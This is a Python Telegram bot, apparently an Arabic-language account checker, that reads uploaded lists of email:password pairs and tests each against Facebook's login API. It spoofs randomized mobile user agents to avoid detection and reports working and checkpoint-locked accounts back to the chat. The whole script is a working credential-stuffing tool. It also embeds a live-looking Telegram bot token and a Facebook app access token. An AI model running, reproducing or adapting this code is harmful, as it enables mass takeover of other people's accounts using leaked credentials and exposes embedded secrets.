import telebot
import requests
import random
def ug():
			rr = random.randint
			andro=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
			rmx=random.choice(['Redmi 7','Redmi Note 8','Redmi 6A','Mi 9 Lite','Redmi Note 11 Pro','Redmi 5A','Mi 9 SE','POCO M4 Pro','POCO X3 Pro','Redmi 5 Plus','Redmi Note 10 Pro','M2007J22G','Redmi 9C NFC'])
			build=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
			vbuild=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
			mark=random.choice(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
			aa_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			bb_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			cc_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			dd_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ee_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ff_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			gg_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			hh_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ii_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			jj_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			kk_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ll_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			mm_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			nn_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			oo_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			pp_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			Usergen = random.choice([aa_L7N,bb_L7N,cc_L7N,dd_L7N,ee_L7N,ff_L7N,gg_L7N,hh_L7N,ii_L7N,jj_L7N,kk_L7N,ll_L7N,mm_L7N,nn_L7N,oo_L7N,pp_L7N])
			return Usergen
TOKEN = "6595541927:AAGNKnX2qT_HFn-l0aN2UpydTbCqWWNFbyE"
bot = telebot.TeleBot(TOKEN)
@bot.message_handler(content_types=['document'])
def handle_document(message):
	# التحقق من نوع الملف
	if message.document.mime_type == 'text/plain':
		# الحصول على معلومات الملف
		file_info = bot.get_file(message.document.file_id)
		
		# تنزيل الملف
		downloaded_file = bot.download_file(file_info.file_path)
		
		# تحويل الملف المنزل إلى سلسلة نصية
		text_content = downloaded_file.decode('utf-8')
		# قراءة المحتوى النصي ومعالجته
		lines = text_content.split('\n')
		filtered_lines = [line.strip() for line in lines if ':' in line]
		results=[]
		for line in filtered_lines:
			z=line.split(":")
			#print(len(z))
			email=z[0]
			password=z[1]
			#g4q = random.choice(User_Agent)
			data ={"locale": "en_GB","format": "json","email": email,"password": password,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
			head = {'user-agent': ug(),'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
			if 'session_key' in po:
				bot.send_message(message.chat.id,text=f'''
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {email}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {password}
<><><><><><><><><><><><><><>
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
@g_4_q  -  @ToPython
				   		   ''')
			elif 'www.facebook.com' in po['error']['message']:
  				bot.send_message(message.chat.id,text=f'''
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙secure
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {email}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {password}
<><><><><><><><><><><><><><>
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
@g_4_q  -  @ToPython
				   		   ''')
			else:pass
		else:
			response = "لا يوجد بيانات صالحة في الملف.\nيجب أن تكون البيانات علي النمط التالي\nEmail:password"
			bot.reply_to(message, response)	
	else:
			# في حالة عدم وجود ملف نصي
		bot.reply_to(message, 'يرجى إرسال ملف نصي فقط.')
# بدء الاستماع للرسائل الواردة
bot.polling()
